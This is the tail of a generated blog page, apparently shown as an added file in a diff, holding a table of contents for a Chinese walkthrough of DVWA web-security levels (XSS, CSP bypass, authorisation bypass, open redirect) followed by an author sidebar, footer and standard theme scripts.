Scripting (XSS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E8%99%9A%E5%81%87%E7%9A%84%E4%B8%8B%E6%8B%89%E6%A1%86"><span class="nav-number">10.1.</span> <span class="nav-text">Low：虚假的下拉框</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%90%8E%E7%AB%AF%E8%BF%87%E6%BB%A4-script-%E6%A0%87%E7%AD%BE"><span class="nav-number">10.2.</span> <span class="nav-text">Medium：后端过滤 script 标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E5%90%8E%E7%AB%AF%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%8C%E4%BD%86%E5%89%8D%E7%AB%AF%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4"><span class="nav-number">10.3.</span> <span class="nav-text">High：后端白名单，但前端简单粗暴</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E5%89%8D%E7%AB%AF%E4%B8%8D%E8%A6%81-decode"><span class="nav-number">10.4.</span> <span class="nav-text">Impossible：前端不要 decode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflected-Cross-Site-Scripting-XSS"><span class="nav-number">11.</span> <span class="nav-text">Reflected Cross Site Scripting (XSS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4-4"><span class="nav-number">11.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%AD%90%E4%B8%B2%E6%9B%BF%E6%8D%A2"><span class="nav-number">11.2.</span> <span class="nav-text">Medium：子串替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%9B%BF%E6%8D%A2"><span class="nav-number">11.3.</span> <span class="nav-text">High：正则表达式替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9Ahtmlspecialchars"><span class="nav-number">11.4.</span> <span class="nav-text">Impossible：htmlspecialchars</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stored-Cross-Site-Scripting-XSS"><span class="nav-number">12.</span> <span class="nav-text">Stored Cross Site Scripting (XSS)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4-5"><span class="nav-number">12.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9Aname-%E5%AD%90%E4%B8%B2%E6%9B%BF%E6%8D%A2"><span class="nav-number">12.2.</span> <span class="nav-text">Medium：name 子串替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9Aname-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%9B%BF%E6%8D%A2"><span class="nav-number">12.3.</span> <span class="nav-text">High：name 正则表达式替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9Ahtmlspecialchars-1"><span class="nav-number">12.4.</span> <span class="nav-text">Impossible：htmlspecialchars</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Content-Security-Policy-CSP-Bypass"><span class="nav-number">13.</span> <span class="nav-text">Content Security Policy (CSP) Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E5%BC%95%E7%94%A8-script-%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-number">13.1.</span> <span class="nav-text">Low：引用 script 的限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E4%B8%8D%E5%8F%98%E7%9A%84-nonce"><span class="nav-number">13.2.</span> <span class="nav-text">Medium：不变的 nonce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9AJSONP"><span class="nav-number">13.3.</span> <span class="nav-text">High：JSONP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E7%A1%AC%E7%BC%96%E7%A0%81%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-number">13.4.</span> <span class="nav-text">Impossible：硬编码函数名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript-Attacks"><span class="nav-number">14.</span> <span class="nav-text">JavaScript Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E5%86%85%E8%81%94%E8%84%9A%E6%9C%AC"><span class="nav-number">14.1.</span> <span class="nav-text">Low：内联脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%A4%96%E9%83%A8%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86"><span class="nav-number">14.2.</span> <span class="nav-text">Medium：外部脚本，简单混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%B7%B7%E6%B7%86"><span class="nav-number">14.3.</span> <span class="nav-text">High：高级混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E4%B8%8D%E8%A6%81%E7%9B%B8%E4%BF%A1%E5%89%8D%E7%AB%AF%E5%8F%91%E6%9D%A5%E7%9A%84%E4%BB%BB%E4%BD%95%E6%95%B0%E6%8D%AE"><span class="nav-number">14.4.</span> <span class="nav-text">Impossible：不要相信前端发来的任何数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Authorisation-Bypass"><span class="nav-number">15.</span> <span class="nav-text">Authorisation Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4-6"><span class="nav-number">15.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9AUI-%E4%B8%8D%E8%AE%A9%E8%BF%9B%EF%BC%8C%E6%8E%A5%E5%8F%A3%E8%BF%98%E8%83%BD%E7%94%A8"><span class="nav-number">15.2.</span> <span class="nav-text">Medium：UI 不让进，接口还能用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E4%BF%AE%E6%94%B9%E6%8E%A5%E5%8F%A3%E4%BB%8D%E5%8F%AF%E7%94%A8"><span class="nav-number">15.3.</span> <span class="nav-text">High：修改接口仍可用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E5%85%A8%E9%83%A8%E9%89%B4%E6%9D%83"><span class="nav-number">15.4.</span> <span class="nav-text">Impossible：全部鉴权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Open-HTTP-Redirect"><span class="nav-number">16.</span> <span class="nav-text">Open HTTP Redirect</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E7%9B%B4%E6%8E%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">16.1.</span> <span class="nav-text">Low：直接重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E4%B8%8D%E8%83%BD%E5%90%AB%E6%9C%89%E5%8D%8F%E8%AE%AE%E5%90%8D"><span class="nav-number">16.2.</span> <span class="nav-text">Medium：不能含有协议名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB%E5%AD%90%E4%B8%B2"><span class="nav-number">16.3.</span> <span class="nav-text">High：必须包含子串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E7%99%BD%E5%90%8D%E5%8D%95-2"><span class="nav-number">16.4.</span> <span class="nav-text">Impossible：白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9AWeb-%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="nav-number">17.</span> <span class="nav-text">总结：Web 安全的一些最佳实践</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuyaxiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="fa fa-user">
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuyaxiao</span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
